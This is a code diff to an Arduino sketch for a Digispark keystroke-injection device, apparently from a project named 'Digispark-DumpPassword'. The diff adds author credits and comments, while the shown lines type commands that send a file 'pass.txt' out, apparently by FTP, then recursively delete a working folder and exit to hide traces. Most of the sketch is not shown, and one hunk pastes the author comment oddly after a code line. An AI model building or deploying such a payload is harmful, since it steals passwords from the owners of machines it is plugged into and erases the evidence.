@@ -1,8 +1,13 @@
-#include <Arduino.h> //Remove this if using Arduino IDE
-#include <explo1t.h>
-#include "DigiKeyboard.h"
-#define KEY_TAB 43
+/* Author: Pankaj Sheoran
+   Alias: punkjj
+   GitHub: github.com/punkjj
+   Repo Link: github.com/punkjj/Digispark-DumpPassword
+*/
 
+#include <Arduino.h> //Remove this if using Arduino IDE
+#include <explo1t.h> // Header file which contains easy to use functions
+#include "DigiKeyboard.h" // DigiSpark specific header file
+#define KEY_TAB 43 // TAB Key is not pre-defined in DigiKeyboard.h like other keys
 
 void setup()
 {
@@ -47,7 +52,11 @@ void setup()
     printThis("send pass.txt", 6000);
     printThis("close", 200);
     printThis("quit", 200);
-    printThis("cd c:/", 300);
+    printThis("cd c:/", 300);/* Author: Pankaj Sheoran
+   Alias: punkjj
+   GitHub: github.com/punkjj
+   Repo Link: github.com/punkjj/Digispark-DumpPassword
+   */
     printThis("rmdir C:\\123 /s", 1000);
     printThis("y", 400);
     printThis("exit", 0);
